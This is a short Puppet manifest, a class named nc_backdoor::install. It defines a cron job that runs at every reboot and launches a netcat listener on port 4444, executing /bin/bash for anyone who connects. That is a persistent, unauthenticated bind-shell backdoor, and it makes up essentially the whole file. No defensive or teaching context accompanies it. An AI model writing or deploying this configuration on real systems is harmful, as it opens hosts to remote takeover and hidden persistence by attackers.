class nc_backdoor::install {
  # package { 'nc':
  #   ensure => installed
  # }

  # TODO: parameter for port number
  cron { 'backdoor':
    command     => 'nc -l -p 4444 -e /bin/bash',
    special     => 'reboot',
  }
}
